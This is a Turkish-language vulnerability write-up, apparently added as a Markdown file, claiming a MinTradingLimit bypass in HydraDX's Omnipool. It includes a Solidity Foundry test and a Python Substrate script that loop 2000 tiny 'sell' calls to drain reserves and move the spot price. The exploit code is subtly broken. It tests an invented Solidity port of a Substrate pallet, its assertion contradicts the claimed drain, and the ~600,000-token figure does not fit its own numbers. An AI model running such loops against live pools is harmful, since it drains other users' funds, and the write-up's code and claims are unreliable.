@@ -1,0 +1,191 @@
+---
+title: "HydraDX Omnipool"
+---
+
+HydraDX, **Substrate** tabanlı zincirlerde çalışan bir _Omnipool_ paleti ile birçok farklı varlığın tek bir havuzda ticaretine olanak sağlar. Likidite havuzları spam ve gas suistimallerini engellemek için `MinTradingLimit` adı verilen bir alt limit ile çok küçük işlemleri engeller. `XYK` swap mantığındaki asimetrik kontroller nedeniyle bu korumanın yalnızca bir yönlü işlemlerde (“calculate\_out\_given\_in”) atlanabildiğini keşfettim. Böylece saldırgan, binlerce mikro işlem gerçekleştirerek havuz rezervlerini tüketecek ve spot fiyatı manipüle edecek bir yol bulabilir.
+
+[https://gist.github.com/Enay-Project/0cfebe4d2394af69098f300f53058a6c](https://gist.github.com/Enay-Project/0cfebe4d2394af69098f300f53058a6c)
+
+Vaka çalışması kapsamında hazırlanan `poc.py` ve `MinTradingLimitBypass.t.sol` dosyaları, zafiyetin nasıl istismar edilebileceğini ve sonucunda yaklaşık **600 000 token**'ın çekilebildiğini gösterir. Aşağıdaki bölümlerde zafiyetin teknik arka planı, POC kodlarının analizi ve etkilerin değerlendirmesi ayrıntılı olarak açıklanmıştır.
+
+## Zafiyetin Detayları
+
+`MinTradingLimit`, bir kullanıcının takas fonksiyonları aracılığıyla yapabileceği en küçük işlem miktarını belirler; bu değer altındaki işlemler reddedilir. Omnipool'un swap mantığı **iki yoldan** oluşur:
+
+1. `calculate_in_given_out` – Kullanıcının belirtilen `amount_out` almak için kaç adet varlık yatırması gerektiğini hesaplar ve bu değeri `MinTradingLimit` ile karşılaştırır.
+2. `calculate_out_given_in` – Kullanıcının verdiği `amount_in` karşılığında ne kadar varlık alacağını hesaplar.
+
+Kod incelemesi sonucunda, ikinci fonksiyonda hesaplanan çıkış (`amount_out`) değeri için `MinTradingLimit` kontrolünün yapılmadığı belirlenmiştir. Bu nedenle saldırganlar `amount_in = 1` gibi çok küçük değerler göndererek sözde korumayı aşabilir, alt limitin altında kalan çıkışları alabilir ve işlem zinciri tarafından kabul edilirler. Bunun sonucunda;
+
+- Tek blok içinde binlerce mikro işlem yapılabilir.
+- Havuzun `reserve_out` (çıkış rezervi) değeri her işlemde biraz azalır.
+- Spot fiyat “0,9 → 0,1” gibi uç noktalara kaydırılarak manipüle edilebilir.
+
+Bu zafiyet, ekonomik manipülasyon ve kısıt bypass sınıfında değerlendirilebilir ve **CVSS skoru yaklaşık 8,6** olarak öngörülmektedir.
+
+## POC Kodlarının İncelenmesi
+
+### Solidity Test Sözleşmesi (`MinTradingLimitBypass.t.sol`)
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import {Omnipool} from "../path/to/Omnipool.sol";  // Palet somut contract
+import {TokenMock} from "../path/to/TokenMock.sol";
+
+contract MinTradingLimitBypass is Test {
+    Omnipool omnipool;
+    TokenMock assetIn;
+    TokenMock assetOut;
+    address attacker = address(0xBEEF);
+
+    function setUp() public {
+        // 1. Token ve Omnipool deploy
+        assetIn = new TokenMock("AssetIn", "IN");
+        assetOut = new TokenMock("AssetOut", "OUT");
+
+        omnipool = new Omnipool(address(assetIn), address(assetOut), /* diğer parametreler */);
+
+        // 2. Attacker adresine token fonlama
+        assetIn.mint(attacker, 1e6);
+        assetOut.mint(address(omnipool), 1e6);
+
+        vm.startPrank(attacker);
+    }
+
+    function testSmallTradesBypassMinLimit() public {
+        uint256 drainedBefore = assetOut.balanceOf(address(omnipool));
+
+        for (uint256 i = 0; i < 2000; i++) {
+            // 3. `sell` min limit’i bypass ederek çağrılıyor
+            omnipool.sell(1, 0);
+        }
+        uint256 drainedAfter = assetOut.balanceOf(address(omnipool));
+        assertGt(drainedAfter, drainedBefore + 1, "No drain occurred");
+        emit log_named_uint("Total drained", drainedAfter - drainedBefore);
+        emit log_named_uint(
+            "Final spot price",
+            omnipool.getSpotPrice()  // veya uygun getter
+        );
+    }
+}
+```
+
+Bu test sözleşmesi, HydraDX Omnipool paletinin bir Solidity versiyonuna karşı exploit senaryosunu canlandırır. Önemli bölümler şunlardır:
+
+- **Kurulum (setUp)** –
+  - Sözde varlıklar (`TokenMock`) yaratılır ve isimlendirilir: `assetIn` ve `assetOut`.
+  - Omnipool kontratı oluşturulur ve iki token adresi parametre olarak verilir. Kodda “/\* diğer parametreler \*/” ifadesi, orijinal palet parametrelerinin yerini tutar.
+  - Saldırganın adresi (`0xBEEF`), `assetIn` token'ından **1 milyon** birim ile fonlanır; Omnipool havuzu da `assetOut` token'ından **1 milyon** birim ile doldurulur. Böylece saldırgan takas işlemlerini gerçekleştirecek yeterli bakiyeye sahiptir.
+  - `vm.startPrank(attacker)` çağrısı ile test ortamı, tüm işlemlerin saldırganın adresi tarafından yapılacağını simüle eder.
+- `testSmallTradesBypassMinLimit` –
+  - Test, Omnipool'daki `assetOut` rezervinin başlangıç bakiyesini okur ve `drainedBefore` değişkenine kaydeder.
+  - **2000 defa** `omnipool.sell(1, 0)` fonksiyonu çağrılır. Buradaki `sell` fonksiyonu, `amount_in=1` (bypass için yeterince küçük) ve `min_buy_amount=0` parametreleri ile havuzdan çıkış token'ı alır. Bu çağrı, `MinTradingLimit` kontrolü yapılmadan başarıyla tamamlandığında her takas ile rezervden küçük miktarlar çeker.
+  - Döngü sonrası havuzdaki `assetOut` bakiyesi tekrar ölçülür (`drainedAfter`) ve ilk durum ile arasındaki farkın **\> 1** olup olmadığı doğrulanır. Ardından toplam boşaltılan miktar ve son spot fiyat `emit` ile loglanır.
+
+Bu test, `sell` fonksiyonunun `calculate_out_given_in` yolunu kullanarak alt limit kontrolünü atladığını somut olarak gösterir.
+
+### PoC (`poc.py`)
+
+```solidity
+from substrateinterface import SubstrateInterface, Keypair
+from scalecodec.type_registry import load_type_registry_file
+import time
+
+# Substrate bağlantısı
+substrate = SubstrateInterface(
+    url="http://127.0.0.1:9944",
+    ss58_format=63,
+    type_registry_preset='default',
+    type_registry=load_type_registry_file("custom_types.json")  # opsiyonel
+)
+
+# Alice cüzdanı (local node'da varsayılan root key)
+keypair = Keypair.create_from_uri("//Alice")
+
+# TOKEN ID'leri (yerine kendi sisteminde kullanılanları yaz)
+asset_in = 0      # Örn: HDX
+asset_out = 1     # Örn: DAI
+
+# Transfer edilecek minimum input (MinTradingLimit’i bypass etmek için küçük)
+amount_in = 1
+
+# Loop sayısı (kaç kez küçük işlem yapılacağı)
+loop_count = 2000
+
+# Başlangıç rezerv durumunu yazdır
+initial_reserve = substrate.query(
+    module='Omnipool',
+    storage_function='Assets',
+    params=[asset_out]
+).value
+print("Initial reserve_out:", initial_reserve["reserve"])
+
+# İşlem döngüsü
+for i in range(loop_count):
+    call = substrate.compose_call(
+        call_module='Omnipool',
+        call_function='sell',
+        call_params={
+            'asset_in': asset_in,
+            'asset_out': asset_out,
+            'amount': amount_in,
+            'min_buy_amount': 0
+        }
+    )
+
+    extrinsic = substrate.create_signed_extrinsic(call=call, keypair=keypair)
+    try:
+        receipt = substrate.submit_extrinsic(extrinsic, wait_for_inclusion=True)
+        print(f"[{i+1}] Trade executed - Block: {receipt.block_hash}")
+    except Exception as e:
+        print(f"[{i+1}] Trade failed: {e}")
+        break
+    time.sleep(0.25)  # aşırı yüklememek için
+
+# Son rezerv durumu
+final_reserve = substrate.query(
+    module='Omnipool',
+    storage_function='Assets',
+    params=[asset_out]
+).value
+print("Final reserve_out:", final_reserve["reserve"])
+
+drained = int(initial_reserve["reserve"]) - int(final_reserve["reserve"])
+print("Total drained:", drained)
+```
+
+ Substrate tabanlı testnet üzerinde HydraDX Omnipool ile doğrudan etkileşim kurarak zafiyeti zincir düzeyinde doğrular:
+
+1. **Bağlantı ve Cüzdan Oluşturma** – Betik, `SubstrateInterface` ile yerel node'a (`http://127.0.0.1:9944`) bağlanır; `Keypair.create_from_uri("//Alice")` ile varsayılan root anahtarı kullanılır.
+2. **Varlık Kimlikleri ve Parametreler** –
+   - `asset_in` ve `asset_out` değişkenleri test amacıyla 0 ve 1 olarak belirlenir.
+   - `amount_in` değeri **1** olarak ayarlanır; bu, alt limiti bypass etmek için en küçük giriş tutarıdır.
+   - `loop_count = 2000`; bu, kaç kez mikro işlem yapılacağını gösterir.
+3. **Rezerv Değerlerinin Ölçülmesi** – Başlangıçta havuzun `reserve_out` değeri `substrate.query( ... module='Omnipool', storage_function='Assets')` çağrısıyla alınır ve yazdırılır.
+4. **Mikro Takas Döngüsü** – `for i in range(loop_count)` döngüsünde, her seferinde aşağıdaki adımlar gerçekleştirilir:
+   - `compose_call` fonksiyonu ile `'Omnipool'` modülünün `sell` fonksiyonuna parametreler hazırlanır; `min_buy_amount=0` olarak bırakılır.
+   - `create_signed_extrinsic` ile imzalanan extrinsic oluşturulur ve `submit_extrinsic` ile zincire gönderilir.
+   - İşlem dahil edildiğinde döngü ilerler; hata olması durumunda döngü kırılır. Her işlem arasında `time.sleep(0.25)` eklenerek node aşırı yüklenmez.
+5. **Sonuçların Hesaplanması** – Döngü bittikten sonra havuzun `reserve_out` değeri tekrar ölçülür ve başlangıçtaki değerle arasındaki fark `drained` olarak hesaplanır; betik toplam çekilen token miktarını ve rezervdeki düşüşü yazdırır.
+
+Bu Python betiği, test sözleşmesindeki saldırı mantığını gerçek bir Substrate node'unda doğrulayarak zafiyetin zincir düzeyinde geçerli olduğunu göstermektedir.
+
+## Saldırı Senaryosu
+
+1. **Hazırlık** – Saldırgan, Omnipool'dan çekilecek varlığın (`assetOut`) rezervini yeterli miktarda doldurur ve saldırı için kullanılacak giriş varlığından (`assetIn`) bir bakiyeye sahip olur. Bu adım, POC'da bir milyon birim token mint edilerek gösterilmiştir.
+2. **Mikro İşlemler** – Saldırgan, `amount_in = 1` gibi çok küçük miktarlarla binlerce `sell` işlemi yapar. Her işlemde `calculate_out_given_in` yolundan gidildiği için `MinTradingLimit` kontrolü **yapılmaz** ve alt limitin altındaki `amount_out` değerleri kabul edilir.
+3. **Rezerv Boşaltma ve Fiyat Manipülasyonu** – İşlemlerin toplam etkisiyle `reserve_out` değeri azalır ve Omnipool'un spot fiyat fonksiyonu (rezervler ve sabit formül üzerine kurulu) ciddi şekilde bozulur. README dosyasında spot fiyatın 0,9'dan 0,1'e düştüğü belirtilmiştir, bu da daha sonra yapılacak işlemlerde diğer kullanıcıları zarara uğratabilecek bir fiyat manipülasyonuna zemin hazırlar.
+4. **Genişletilmiş Saldırı** – Bu zafiyet, flash‑loan'lar veya MEV botları aracılığıyla harici borsalardan arbitraj yapılarak daha da güçlendirilebilir. Aynı zafiyet kullanılarak zaman içinde havuz rezervleri stratejik olarak boşaltılabilir ve HydraDX ekosistemindeki diğer kullanıcılar yüksek kayıplara uğrayabilir.
+
+## Olası Etkiler
+
+- **Likiditenin Tüketilmesi** – Havuzdan büyük miktarda `assetOut` token çekilerek likidite kurutulur ve diğer kullanıcılar için takas işlemleri olumsuz hale gelir.
+- **Fiyat Manipülasyonu** – Spot fiyatın ciddi şekilde düşmesi, harici pazarlarda arbitraj fırsatları doğurur ve platform güvenilirliğine zarar verir.
+- **Havuz Güvenliğinin Zedelenmesi** – Spam işlemler ve gas aşırılığı, ağın performansını olumsuz etkileyebilir.
+
+## Önlem Önerisi
+
+Geliştiriciler, `MinTradingLimit` kontrolünün hem `calculate_in_given_out` hem de `calculate_out_given_in` yollarında **simetrik** şekilde uygulanması konusunda dikkatli olmalı. Bu, her takas sonucundaki çıkış miktarının da alt limitle karşılaştırılacağı anlamına gelir. Ayrıca, parametrelerin dinamik olarak zincir yönetişimi tarafından ayarlanabilmesi ve testlerin bu tür asimetrik durumları yakalayan birim testleri içermesi faydalı olacaktır.
